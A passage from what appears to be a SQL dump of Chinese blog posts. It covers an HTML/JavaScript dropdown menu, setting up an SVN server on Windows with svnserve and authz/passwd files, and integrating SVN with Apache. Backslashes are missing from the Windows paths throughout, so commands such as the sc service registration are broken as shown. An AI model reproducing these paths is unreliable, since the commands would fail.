&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;ul&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li class=&quot;fli&quot;&gt;&lt;a href=&quot;#&quot;&gt;菜单选项2-2-1&lt;/a&gt;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li class=&quot;lli&quot;&gt;&lt;a href=&quot;#&quot;&gt;菜单选项2-2-2&lt;/a&gt;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;/ul&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;/ul&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li&gt;&lt;a href=&quot;#&quot;&gt;菜单选项2-2&lt;/a&gt;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li class=&quot;lli&quot;&gt;&lt;a href=&quot;#&quot;&gt;菜单选项2-2&lt;/a&gt;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;/ul&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;/div&gt;&lt;!-- position --&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;/div&gt;&lt;!-- menusel --&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;div id=&quot;menu3&quot; class=&quot;menusel&quot;&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;h2&gt;&lt;a href=&quot;#&quot;&gt;菜单3&lt;/a&gt;&lt;/h2&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;div class=&quot;position&quot;&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;ul class=&quot;clearfix typeul&quot;&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li&gt;&lt;a href=&quot;#&quot;&gt;菜单选项3-2&lt;/a&gt;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;a href=&quot;#&quot;&gt;菜单选项3-2&lt;/a&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;ul&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li class=&quot;fli&quot;&gt;&lt;a href=&quot;#&quot;&gt;菜单选项3-2-1&lt;/a&gt;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li class=&quot;lli&quot;&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;a href=&quot;#&quot;&gt;菜单选项3-2-2&lt;/a&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;ul&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li class=&quot;fli&quot;&gt;&lt;a href=&quot;#&quot;&gt;菜单选项3-2-1&lt;/a&gt;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li class=&quot;lli&quot;&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;a href=&quot;#&quot;&gt;菜单选项3-2-2&lt;/a&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;ul&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li class=&quot;fli&quot;&gt;&lt;a href=&quot;#&quot;&gt;菜单选项3-2-1&lt;/a&gt;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li class=&quot;lli&quot;&gt;&lt;a href=&quot;#&quot;&gt;菜单选项3-2-2&lt;/a&gt;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;/ul&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;/ul&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;/ul&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li&gt;&lt;a href=&quot;#&quot;&gt;菜单选项3-2&lt;/a&gt;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;li class=&quot;lli&quot;&gt;&lt;a href=&quot;#&quot;&gt;菜单选项3-2&lt;/a&gt;&lt;/li&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;/ul&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&lt;/div&gt;&lt;!-- position --&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;/div&gt;&lt;!-- menusel --&gt;<br />\r\n&lt;/div&gt;&lt;!-- menu --&gt;<br />\r\n&lt;script type=&quot;text/javascript&quot;&gt;<br />\r\nfor(var x = 1; x &lt; 4; x++)<br />\r\n{<br />\r\n&nbsp;&nbsp; &nbsp;var menuid = document.getElementById(&quot;menu&quot;+x);<br />\r\n&nbsp;&nbsp; &nbsp;menuid.num = x;<br />\r\n&nbsp;&nbsp; &nbsp;type();<br />\r\n}<br />\r\nfunction type()<br />\r\n{<br />\r\n&nbsp;&nbsp; &nbsp;var menuh2 = menuid.getElementsByTagName(&quot;h2&quot;);<br />\r\n&nbsp;&nbsp; &nbsp;var menuul = menuid.getElementsByTagName(&quot;ul&quot;);<br />\r\n&nbsp;&nbsp; &nbsp;var menuli = menuul[0].getElementsByTagName(&quot;li&quot;);<br />\r\n&nbsp;&nbsp; &nbsp;menuh2[0].onmouseover = show;<br />\r\n&nbsp;&nbsp; &nbsp;menuh2[0].onmouseout = unshow;<br />\r\n&nbsp;&nbsp; &nbsp;menuul[0].onmouseover = show;<br />\r\n&nbsp;&nbsp; &nbsp;menuul[0].onmouseout = unshow;<br />\r\n&nbsp;&nbsp; &nbsp;function show()<br />\r\n&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;menuul[0].className = &quot;clearfix typeul block&quot;<br />\r\n&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;function unshow()<br />\r\n&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;menuul[0].className = &quot;typeul&quot;<br />\r\n&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;for(var i = 0; i &lt; menuli.length; i++)<br />\r\n&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;menuli[i].num = i;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;var liul = menuli[i].getElementsByTagName(&quot;ul&quot;)[0];<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if(liul)<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;typeshow();<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;function typeshow()<br />\r\n&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;menuli[i].onmouseover = showul;<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;menuli[i].onmouseout = unshowul;<br />\r\n&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;function showul()<br />\r\n&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;menuli[this.num].getElementsByTagName(&quot;ul&quot;)[0].className = &quot;block&quot;;<br />\r\n&nbsp;&nbsp; &nbsp;}<br />\r\n&nbsp;&nbsp; &nbsp;function unshowul()<br />\r\n&nbsp;&nbsp; &nbsp;{<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;menuli[this.num].getElementsByTagName(&quot;ul&quot;)[0].className = &quot;&quot;;<br />\r\n&nbsp;&nbsp; &nbsp;}<br />\r\n}<br />\r\n&lt;/script&gt;<br />\r\n&lt;/body&gt;<br />\r\n&lt;/html&gt;</p>\r\n',1,1429363940,0,0),(9,8,'Windows下的SVN服务器安装及配置','<p>准备工作</p>\r\n\r\n<p>首先先下载Windows版本的SVN服务器(各位都会使用搜索引擎所以就不提供下载 地址了),这里我以svn-win32-1.4.3的ZIP解压缩版为例,将其解压缩到目标目录,例如我是解压到D盘下的Subversion目录,把 D:Subversionin加到系统环境变量,如果你的解压位置与我不同,那么请按照你的实际路径设置环境变量。</p>\r\n\r\n<p>第一步:创建SVN数据库</p>\r\n\r\n<p>打开Windows命令提示符,执行命令svnadmin create F:SVN,svnadmin create是创建SVN数据库的命令,F:SVN是你的SVN数据库位置,这里我只是举个例子,你可以自己决定SVN数据库位置,执行完以上命令后就 会在F盘下多出一个SVN目录,里面有若干目录和文件,conf目录是用来存放权限配置的,后面会详细说明,dav目录用来提供给apache和 mod_dav_svn存储内部数据,db目录是所有版本控制的数据文件,hooks目录用来放置hook脚本文件,locks目录存放 Subversion文件库锁定数据,用来追踪存取文件库的客户端,format是一个文本文件,里面只放了一个整数,表示当前文件库配置的版本号,还有 个readme.txt不用说也知道是干什么的了。</p>\r\n\r\n<p>第二步:启动SVN服务器</p>\r\n\r\n<p>继续在Windows命令提示符里执行命令svnserve -d -r F:SVN,参数-d是将SVN服务做为后台服务,参数-r是指定SVN服务的根目录位置,F:SVN自然就是SVN根目录了,到这里为止SVN服务 器就已经启动了,可以用SVN客户端测试一下。</p>\r\n\r\n<p>第三步:将SVN服务注册为系统服务</p>\r\n\r\n<p>你可能会问这样岂不是每次启动SVN服务器都要输入一次命令?怎样才能让SVN服务器在开机的时候自动启动呢?答案就是将SVN服务注册到 Windows系统服务,在Windows命令提示符里执行命令<br />\r\nsc create SVN binpath= &quot;&quot;d:subversioninsvnserve.exe&quot; --service -r F:SVN&quot; displayname= &quot;SVN Service&quot; depend= Tcpip start= auto,这个命令是不是有点长?其实很容易理解,sc是Windows自带的系统服务注册工具,微软支持中心 提 供了详细的说明,这里我就不再复述了,参数binpath= &quot;&quot;d:subversioninsvnserve.exe&quot; --service -r F:SVN&quot;和我们前面手动启动SVN服务器的命令很像吧?只是把-d改成了--service,这不难理解,因为现在是服务嘛。好了,现在已经大功告 成了,重起一下试试吧。<br />\r\nPS:如果想从系统服务里删除刚才注册的SVN服务可以使用sc delete SVN命令。</p>\r\n\r\n<p>第四步:设置权限</p>\r\n\r\n<p>各位都是做IT的,为研发中的项目设置合理的权限有多重要就不需要我说了,就拿开发游戏来说吧,程序部门需要有源代码目录的所有权限以及美术资源目录和 策划案目录的获取权限,美术部门需要有美术资源目录的所有权限以及策划案目录的获取权限,而策划部门则需要有策划案目录的所有权限及美术资源目录的获取权 限。接下去就来看看SVN是如何设置权限的,还记得第一步创建SVN数据库时提到的conf目录吧,conf目录里有3个文件,这3个都是文本文件,用计 事本打开它们就行了,我们先看svnserve.conf文件,anon-access项指定了未经验证的用户所具有的操作权限,它有3个有效值,分别是 read,write,none,read为读权限,write为写权限,none为没有任何权限,password-db项用来指定存放用户名和密码的 文件,authz-db项用来指定存放用户权限的文件,realm项用来指定验证范围,这项一般情况下用不到,以上4项默认都是被注释掉的.#号为注释 符,要起用它们只需要把注释符去掉即可。passwd文件是默认存放用户名和密码的文件,例如我设置一个Sol用户,密码为111111,只需在 [users]下添加Sol=111111即可,authz文件是默认指定存放用户权限的文件,[groups]代表分组,这里我们设置个 developer组,将前面创建的Sol用户分到developer组里,同样只需在[groups]下写上developer=Sol即可,[/]代 表根目录,如果我们要设置developer组有完全的访问权限就在下面加上@developer=rw,前面加@符代表组,除此之外我们允许所有人都有 读取权限还要在下面加上*=r,SVN允许对每个目录设置权限,设置方法和根目录差不多,如果到这里你还不是很明白那么请看下面的例子。</p>\r\n\r\n<p>一个权限配置的例子</p>\r\n\r\n<p>我们以游戏项目开发为例,项目名就叫Project1吧,怎么创建SVN数据库上面已经说过了,我们在SVN的根目录下创建一个名为Project1的 本地数据库,先配置conf目录下的svnserve.conf文件,我们不允许任何与研发无关的人员访问此项目,因此我们禁止匿名访问并为每个研发人员 创建个人帐号,权限文件和帐户信息文件用默认同目录下的authz文件和passwd文件就行了。</p>\r\n\r\n<p>svnserve.conf文件配置如下:</p>\r\n\r\n<p>[general]<br />\r\nanon-access = none<br />\r\npassword-db = passwd<br />\r\nauthz-db = authz</p>\r\n\r\n<p>接下去配置passwd文件,为每个研发人员设置个人帐户,假设项目负责人是Sol,程序部门有Tom、Mark,美术部门有John、Alina、 Candice、Ellen,策划部门有Terry、Jane,这里我们为了方便将密码全部设置为000000,现在是例子没关系,实际应用的时候密码就 不能这么随便设置了。</p>\r\n\r\n<p>passwd文件配置如下:</p>\r\n\r\n<p>[users]<br />\r\nSol = 000000<br />\r\nTom = 000000<br />\r\nMark = 000000<br />\r\nJohn = 000000<br />\r\nAlina = 000000<br />\r\nCandice = 000000<br />\r\nEllen = 000000<br />\r\nTerry = 000000<br />\r\nJane = 000000</p>\r\n\r\n<p>帐户都创建好了,现在为他们分配不同的权限,先设置4个组.分别是manager 、developer、artist、designer,将Sol分配到manager组里,将Tom、Mark分配到developer组,将 John、Alina、Candice、Ellen分配到artist组,将Terry、Jane分配到designer组,等会我们会在项目中创建 designs、sources、resources、reports这4个目录,然后在reports目录里为每个人创建一个以自己帐户命名的目录用来 放每个人的工作报告,manager组拥有所有目录的读写权限,developer组拥有sources目录的读写权限以及designs和 resources目录的读取权限,artist组拥有resources目录的读写权限以及designs目录的读取权限,designer组拥有 designs目录的读写权限以及resources目录的读取权限,每个帐户都拥有reports目录下以自己帐户命名的目录的读写权限,也就是说每个 人的工作报告只有自己和项目负责人能看到。</p>\r\n\r\n<p>authz文件配置如下:</p>\r\n\r\n<p>[groups]<br />\r\nmanager = Sol<br />\r\ndeveloper = Tom,Mark<br />\r\nartist = John,Alina,Candice,Ellen<br />\r\ndesigner = Terry,Jane</p>\r\n\r\n<p>[Project1:/]<br />\r\n@manager = rw<br />\r\n* = r</p>\r\n\r\n<p>[Project1:/designs]<br />\r\n@manager = rw<br />\r\n@developer = r<br />\r\n@artist = r<br />\r\n@designer = rw<br />\r\n* = &nbsp;</p>\r\n\r\n<p>[Project1:/sources]<br />\r\n@manager = rw<br />\r\n@developer = rw<br />\r\n* =</p>\r\n\r\n<p>[Project1:/resources]<br />\r\n@manager = rw<br />\r\n@developer = r<br />\r\n@artist = rw<br />\r\n@designer = r<br />\r\n* =</p>\r\n\r\n<p>[Project1:/reports/Sol]<br />\r\nSol = rw<br />\r\n* =</p>\r\n\r\n<p>[Project1:/reports/Tom]<br />\r\n@manager = rw<br />\r\nTom = rw<br />\r\n* =</p>\r\n\r\n<p>[Project1:/reports/Mark]<br />\r\n@manager = rw<br />\r\nMark = rw<br />\r\n* =</p>\r\n\r\n<p>[Project1:/reports/John]<br />\r\n@manager = rw<br />\r\nJohn = rw<br />\r\n* =</p>\r\n\r\n<p>[Project1:/reports/Alina]<br />\r\n@manager = rw<br />\r\nAlina = rw<br />\r\n* =</p>\r\n\r\n<p>[Project1:/reports/Candice]<br />\r\n@manager = rw<br />\r\nCandice = rw<br />\r\n* =</p>\r\n\r\n<p>[Project1:/reports/Ellen]<br />\r\n@manager = rw<br />\r\nEllen = rw<br />\r\n* =</p>\r\n\r\n<p>[Project1:/reports/Terry]<br />\r\n@manager = rw<br />\r\nTerry = rw<br />\r\n* =</p>\r\n\r\n<p>[Project1:/reports/Jane]<br />\r\n@manager = rw<br />\r\nJane = rw<br />\r\n* =</p>\r\n\r\n<p>目录的权限都设置完了,但是目录我们还没有创建,现在只有项目负责人才有权限在项目根目录下创建目录,所以我们用Sol的帐户来创建designs、 reports、resources、sources这4个目录,然后再到reports目录里为每个人创建以各自帐户命名的工作报告目录,好了,到这里 就全部搞定了,收工。</p>\r\n',0,1429364385,0,0),(10,8,'svn与apache结合','<p><strong><span style=\"font-size:20px\">svn与apache结合一</span></strong><br />\r\n关键字: svn与apache结合</p>\r\n\r\n<p>1. 安装与svn对应的apache版本</p>\r\n\r\n<p>2.把svn安装目录下（比如：D:Program FilesSubversionin）的mod_authz_svn.so和mod_dav_svn.so文件拷贝到apache的安装目录（D:Program FilesApache GroupApache2modules）下</p>\r\n\r\n<p>3.修改D:Program FilesApache GroupApache2confhttpd.conf文件</p>\r\n\r\n<p>因为apache和svn整合需要依赖的2个Module(145,146行)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; LoadModule cgi_module modules/mod_cgi.so&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; LoadModule dav_module modules/mod_dav.so &nbsp;</p>\r\n\r\n<p>把这2行注释取消</p>\r\n\r\n<p>同时添加svn的Module：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; LoadModule dav_svn_module modules/mod_dav_svn.so&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; LoadModule authz_svn_module modules/mod_authz_svn.so &nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>最后在配置请求：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; &lt;Location /svn&gt; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; DAV svn&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; SVNPath D:/svn/reponsitory&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; Location&gt; &nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>重启apache. 现在svn仓库里的文件都可以通过apache来访问了：</p>\r\n\r\n<p>比如：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; http://localhost/svn/ &nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;如果这样配置的话，因为没有配置认证信息，所以，任何人都可以访问。</p>\r\n\r\n<p>如果把Location部分改为：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; &lt;Location /svn&gt; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; DAV svn&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; SVNPath D:/svn/reponsitory&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; AuthType Basic&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; AuthName &quot;Subversion Reponsitory&quot;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; AuthUserFile d:/test/passwords&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; Require valid-user&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;/Location&gt; &nbsp;</p>\r\n\r\n<p>AuthType:认证类型<br />\r\nAuthName:弹出认证窗口时的标题<br />\r\nAuthUserFile:认证用户名和密码文件，默认是密码是md5加密<br />\r\nRequire valid-user:是否需要认证</p>\r\n\r\n<p><br />\r\nD:Program FilesApache GroupApache2in下有个htpasswd命令<br />\r\nhtpasswd help可以查看具体用法<br />\r\n-c是新建立个密码文件<br />\r\n如：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; htpasswd -c c:/test/passwords admin&nbsp; &nbsp;</p>\r\n\r\n<p>回车后就会提示输入新添加的admin用户的密码<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n不带-c参数是追加一个新用户test</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; htpasswd&nbsp; c:/test/passwords test &nbsp;</p>\r\n\r\n<p><br />\r\n-p是密码不加密，如：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; htpasswd -p d:/test/passwords test1 &nbsp;</p>\r\n\r\n<p><br />\r\n<span style=\"color:#FF0000\">如果2个用户的密码都是md5加密的，并且密码一样，在密码文件里存的也是不一样的。<br />\r\n如果直接在密码文件里输入内容，按照一定的明文格式来新添加用户和密码也是可以的。</span></p>\r\n\r\n<p><br />\r\ntelnet www.wsay.net 80 ,默认端口23 ,所以在这里要写80<br />\r\nHead / HTTP/1.1<br />\r\nHost: www.wsay.net</p>\r\n\r\n<p><br />\r\nGet /index.html HTTP/1.1<br />\r\nHost: www.wsay.net<br />\r\n<a href=\"http://ttitfly.javaeye.com/blog/136467\">策略模式(Strategy模式)</a> | <a href=\"http://ttitfly.javaeye.com/blog/134570\">svn与apache结合一</a><br />\r\n2007-10-22<br />\r\n<strong><span style=\"font-size:20px\">svn与apache结合二</span></strong><br />\r\n关键字: svn与apache结合高级</p>\r\n\r\n<p>1. 如果将Location部分的SVNPath改为SVNParentPath,如下：<br />\r\nxml 代码</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; &lt;Location /svn&gt; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; DAV svn&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; SVNParentPath D:/svn/reponsitory&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; AuthType Basic&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; AuthName &quot;Subversion Reponsitory&quot;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; AuthUserFile d:/test/passwords&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; Require valid-user&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;/Location&gt; &nbsp;</p>\r\n\r\n<p><br />\r\n则svn 的父仓库我们都无法访问到了，只能访问它的子仓库。</p>\r\n\r\n<p>所以需要建立子仓库：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; svnadmin create d:/svn/reponsitory/child1 &nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>现在如果你向仓库里导入一个project,比如用TortoiseSVN&nbsp; 来import&nbsp; ,如果你再地址栏里输入：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; http://localhost/svn/aaa &nbsp;</p>\r\n\r\n<p>则<span style=\"color:#FF0000\">表示aaa必须是个已经存在的子仓库</span>。否则失败</p>\r\n\r\n<p>查看的话也是一样的，比如：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; http://localhost/svn/bbbb &nbsp;</p>\r\n\r\n<p><br />\r\n<span style=\"color:#FF0000\">则bbbb也是个已经存在的子仓库。而不是父仓库下的bbbb项目。因为bbbb项目你是没办法访问到了</span></p>\r\n\r\n<p>如果Require valid-user改为下面：</p>\r\n\r\n<p>则表示匿名用户可以有读权限，而没有写和修改的权限 <span style=\"color:#FF0000\">（一个用户对所有子仓库里的项目权限都是一样的。）</span></p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; &lt;Location /svn&gt; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; DAV svn&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; SVNParentPath D:/svn/reponsitory&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; AuthType Basic&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; AuthName &quot;Subversion Reponsitory&quot;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; AuthUserFile d:/test/passwords&nbsp; &nbsp;<br 